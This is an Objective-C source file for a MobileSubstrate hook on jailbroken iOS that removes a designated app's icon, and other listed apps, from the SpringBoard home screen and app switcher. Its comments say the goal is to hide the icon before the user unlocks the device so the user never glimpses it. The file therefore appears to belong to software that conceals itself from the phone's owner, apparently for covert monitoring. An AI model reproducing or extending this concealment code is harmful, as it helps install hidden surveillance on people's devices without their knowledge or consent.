//
//  VisibilityNotifier.m
//  MSFSP
//
//  Created by Makara Khloth on 5/30/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "VisibilityNotifier.h"
#import "DefStd.h"
#import "Visibility.h"

#import "SBAppSwitcherModel.h"
#import "SBIconModel.h"
#import "SBApplicationController.h"
#import "SBApplicationController+iOS8.h"
#import "SBApplication.h"
#import "SBIconController.h"

#import "SBIconModel+IOS6.h"

#import "SBDisplayItem.h"
#import "SBDisplayLayout.h"

#import "SBAppSwitcherModel+iOS9.h"

#include <objc/runtime.h>
#import <notify.h>

static VisibilityNotifier *_visibilityNotifier = nil;

@implementation VisibilityNotifier

+ (id) shareVisibilityNotifier {
	if (_visibilityNotifier == nil) {
		_visibilityNotifier = [[VisibilityNotifier alloc] init];
	}
	return (_visibilityNotifier);
}

- (id) init {
	if ((self = [super init])) {
		mMessagePort = [[MessagePortIPCReader alloc] initWithPortName:kAppVisibilityMessagePort
										   withMessagePortIPCDelegate:self];
		[mMessagePort start];
        
        /* For iOS 8, we move our daemon plist into the new place. We suspect that the service which starts from this new place may launch slower and after
         the user unlocks the device with passcode. This results that the code to hide the icon which starts from daemon executes slowly. Then the user can
         see the icon that we try to hide around 5-10 seconds. 
            Then on iOS 8, we will add the code to hide the icon to mobile substrate so that it can hide the icon until SpringBoard did launch
         */
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
            DLog(@"!!!! register for lockstate for iOS 8,9 !!!!")
            __block int notifyToken = 0;
            int status              = notify_register_dispatch("com.apple.springboard.lockstate",
                                                  &notifyToken,
                                                  dispatch_get_main_queue(), ^(int t) {
                                                      uint64_t state = 0;
                                                      notify_get_state(notifyToken, &state);
                                                      
                                                      DLog(@"*************************************************")
                                                      DLog(@"!!!!!! lock state change  ,notifyToken = %d !!!!!! ", notifyToken);
                                                      DLog(@"!!!!!! lock state change  ,state= %llu !!!!!! ", state);
                                                      DLog(@"*************************************************")
                                                      
                                                      if (state == 0) {
                                                          DLog(@"++++++++ HIDE ICON ++++++++")
                                                          VisibilityNotifier *visibilityNotifier = [VisibilityNotifier shareVisibilityNotifier];
                                                          [visibilityNotifier dataDidReceivedFromMessagePort:nil];
                                                          
                                                          if (notifyToken != 0) {
                                                              notify_cancel(notifyToken);
                                                              notifyToken = 0;
                                                          }

                                                      }
                                                  });
            
            if (status != NOTIFY_STATUS_OK) {
                DLog(@"notify_register_dispatch() not returning NOTIFY_STATUS_OK %d", status);
            }
        }
	}
	return (self);
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog(@"VisibilityNotifier ========> dataDidReceivedFromMessagePort: aRawData = %@", aRawData);
	Visibility* vis = [[[Visibility alloc] init] autorelease];
	
	DLog (@"mHideDesktopIcon = %d", [vis mHideDesktopIcon]);
	DLog (@"mHideAppSwitcherIcon = %d", [vis mHideAppSwitcherIcon]);
	DLog (@"mBundleID = %@", [vis mBundleID]);
	DLog (@"mBundleName = %@", [vis mBundleName]);
	DLog (@"mHiddenBundleIdentifiers = %@", [vis mHiddenBundleIdentifiers]);
	DLog (@"mShownBundleIdentifiers = %@", [vis mShownBundleIdentifiers]);
	
	Class $SBApplicationController = objc_getClass("SBApplicationController");
	SBApplicationController *sbApplicationController = [$SBApplicationController sharedInstance];
	
	NSArray *applications = nil;
    SBApplication *ssmp = nil;
    if ([sbApplicationController respondsToSelector:@selector(applicationsWithBundleIdentifier:)]) {
        applications = [sbApplicationController applicationsWithBundleIdentifier:vis.mBundleID];
        ssmp = [applications count] ? [applications objectAtIndex:0] : nil;
    } else {
        // iOS 8
        ssmp = [sbApplicationController applicationWithBundleIdentifier:vis.mBundleID];
    }
	
	Class $SBIconModel = objc_getClass("SBIconModel");
	Class $SBAppSwitcherModel = objc_getClass("SBAppSwitcherModel");
	
	SBAppSwitcherModel *sbAppSwitcherModel = [$SBAppSwitcherModel sharedInstance];
	
	SEL layoutSelector = nil;
	SEL clearSelector = nil;
	SBIconModel *sbIconModel = nil;
	if ([$SBIconModel respondsToSelector:@selector(sharedInstance)]) {
		sbIconModel = [$SBIconModel sharedInstance];
		layoutSelector = @selector(relayout);
		clearSelector = @selector(clearCachedUserGeneratedIconState); // Not exist in iOS 6
		//[sbIconModel clearCachedUserGeneratedIconStateIfPossible]; // Not exist for iOS 4.2.1 (tested)
	} else {
		// From IOS 6 onward there is no class method sharedInstance in SBIconModel thus get from SBIconController's
		// instance variable
		Class $SBIconController = objc_getClass("SBIconController");
		SBIconController *sbIconController = [$SBIconController sharedInstance];
		object_getInstanceVariable(sbIconController, "_iconModel", (void **)&sbIconModel);
		layoutSelector = @selector(layout);
		clearSelector = @selector(clearDesiredIconStateIfPossible);
	}
    
    DLog(@"ssmp = %@", ssmp);
    DLog(@"sbIconModel = %@", sbIconModel);
    DLog(@"layoutSelector = %@, clearSelector = %@", NSStringFromSelector(layoutSelector), NSStringFromSelector(clearSelector));
    
    Class $SBDisplayItem = objc_getClass("SBDisplayItem");
    Class $SBDisplayLayout = objc_getClass("SBDisplayLayout");
    
    id displayObjectSystemCore = nil;
    if ([sbApplicationController respondsToSelector:@selector(applicationsWithBundleIdentifier:)]) {
        // iOS below 8
        displayObjectSystemCore = vis.mBundleID;
    } else {
        // iOS 8
        SBDisplayItem *sbDisplayItem = [$SBDisplayItem displayItemWithType:@"App" displayIdentifier:vis.mBundleID];
        NSArray *displayItems = [NSArray arrayWithObject:sbDisplayItem];
        SBDisplayLayout *sbDisplayLayout = [[[$SBDisplayLayout alloc] initWithLayoutSize:0 displayItems:displayItems] autorelease];
        displayObjectSystemCore = sbDisplayLayout;
        if (!displayObjectSystemCore) { // iOS 9, SBDisplayLayout does not exist
            displayObjectSystemCore = sbDisplayItem;
        }
    }
    
    DLog(@"$SBDisplayItem = %@", $SBDisplayItem);
    DLog(@"$SBDisplayLayout = %@", $SBDisplayLayout);
    DLog(@"displayObjectSystemCore, %@", displayObjectSystemCore);

	// ssmp
	if (![vis mHideDesktopIcon]) {
		[sbIconModel addIconForApplication:ssmp];
		[sbIconModel performSelector:layoutSelector];
		
        if ([sbAppSwitcherModel respondsToSelector:@selector(addToFront:)]) { // Below iOS 9
            [sbAppSwitcherModel addToFront:displayObjectSystemCore];
            // addToFront in turn will call _saveRecents
        } else if ([sbAppSwitcherModel respondsToSelector:@selector(addToFront:role:)]) { // iOS 9
            [sbAppSwitcherModel addToFront:displayObjectSystemCore role:2];
        }
	} else {
		[sbIconModel removeIconForIdentifier:[ssmp bundleIdentifier]];
		[sbIconModel performSelector:clearSelector];
		[sbIconModel performSelector:layoutSelector];
		
		[sbAppSwitcherModel remove:displayObjectSystemCore];
		[sbAppSwitcherModel _saveRecents];
	}
    
	// Hidden list
	for (NSString *bundleIdentifier in [vis mHiddenBundleIdentifiers]) {
		// SpringBoard
		[sbIconModel removeIconForIdentifier:bundleIdentifier];
		[sbIconModel performSelector:clearSelector];
		[sbIconModel performSelector:layoutSelector];
		
        if ([sbApplicationController respondsToSelector:@selector(applicationsWithBundleIdentifier:)]) {
            // AppSwitcher
            [sbAppSwitcherModel remove:bundleIdentifier];
        } else {
            SBDisplayItem *sbDisplayItem = [$SBDisplayItem displayItemWithType:@"App" displayIdentifier:bundleIdentifier];
            if ($SBDisplayLayout) { // iOS 8
                NSArray *displayItems = [NSArray arrayWithObject:sbDisplayItem];
                SBDisplayLayout *sbDisplayLayout = [[[$SBDisplayLayout alloc] initWithLayoutSize:0 displayItems:displayItems] autorelease];
                
                // AppSwitcher
                [sbAppSwitcherModel remove:sbDisplayLayout];
            } else { // iOS 9
                [sbAppSwitcherModel remove:sbDisplayItem];
            }
        }
		
		[sbAppSwitcherModel _saveRecents];
	}
    
	// Shown list
	for (NSString *bundleIdentifier in [vis mShownBundleIdentifiers]) {
		// SpringBoard
        SBApplication *sbApplication = nil;
        if ([sbApplicationController respondsToSelector:@selector(applicationsWithBundleIdentifier:)]) {
            applications = [sbApplicationController applicationsWithBundleIdentifier:bundleIdentifier];
            sbApplication = [applications count] ? [applications objectAtIndex:0] : nil;
            [sbIconModel addIconForApplication:sbApplication];
            [sbIconModel performSelector:layoutSelector];
            
            // AppSwitcher
            [sbAppSwitcherModel addToFront:bundleIdentifier];
        } else {
            // iOS 8,9
            sbApplication = [sbApplicationController applicationWithBundleIdentifier:bundleIdentifier];
            [sbIconModel addIconForApplication:sbApplication];
            [sbIconModel performSelector:layoutSelector];
            
            id displayObject = nil;
            SBDisplayItem *sbDisplayItem = [$SBDisplayItem displayItemWithType:@"App" displayIdentifier:bundleIdentifier];
            if ($SBDisplayLayout) { // iOS 8
                NSArray *displayItems = [NSArray arrayWithObject:sbDisplayItem];
                SBDisplayLayout *sbDisplayLayout = [[[$SBDisplayLayout alloc] initWithLayoutSize:0 displayItems:displayItems] autorelease];
                displayObject = sbDisplayLayout;
            } else { // iOS 9
                displayObject = sbDisplayItem;
            }
            
            // AppSwitcher
            if ([sbAppSwitcherModel respondsToSelector:@selector(addToFront:)]) { // iOS 8
                [sbAppSwitcherModel addToFront:displayObject];
            } else if ([sbAppSwitcherModel respondsToSelector:@selector(addToFront:role:)]) { // iOS 9
                [sbAppSwitcherModel addToFront:displayObject role:2];
            }
        }
	}
	
	DLog (@"DONE HIDE OR SHOW ICONS ========>");
}

- (void) dealloc {
	[mMessagePort release];
	[super dealloc];
}

@end
